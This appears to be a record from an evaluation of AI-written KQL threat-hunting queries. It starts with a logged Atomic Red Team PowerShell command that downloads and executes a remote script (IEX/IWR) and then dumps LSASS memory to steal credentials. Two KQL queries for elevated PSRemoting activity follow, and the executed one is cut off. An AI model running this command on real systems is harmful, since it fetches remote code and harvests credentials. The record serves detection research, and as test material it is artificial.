KQL_query_results:
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\\"" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump}

all_attempts.query_llm:
// Query elevated PowerShell executions that may have enabled PSRemoting

// Search in DeviceProcessEvents
let processEvents = DeviceProcessEvents
| where FileName endswith "powershell.exe"
| where ProcessTokenElevation == "High"
| where ProcessCommandLine has "Enable-PSRemoting"
| project TimeGenerated, DeviceName, AccountName, ExecutedCommand = ProcessCommandLine, Source = "DeviceProcessEvents";

// Search in DeviceEvents (using initiating process command-line field)
let deviceEvents = DeviceEvents
| where FileName endswith "powershell.exe"
| where ProcessTokenElevation == "High"
| where InitiatingProcessCommandLine has "Enable-PSRemoting"
| project TimeGenerated, DeviceName, AccountName, ExecutedCommand = InitiatingProcessCommandLine, Source = "DeviceEvents";

// Union results from both sources
processEvents
| union deviceEvents
| order by TimeGenerated desc

all_attempts.query_executed:
// Query elevated PowerShell executions that may have enabled PSRemoting

// Search in DeviceProcessEvents_CL
let processEvents = DeviceProcessEvents_CL
| where FileName endswith "powershell.exe"
| where ProcessTokenElevation == "High"
| where ProcessCommandLine has "Enable-PSRemoting"
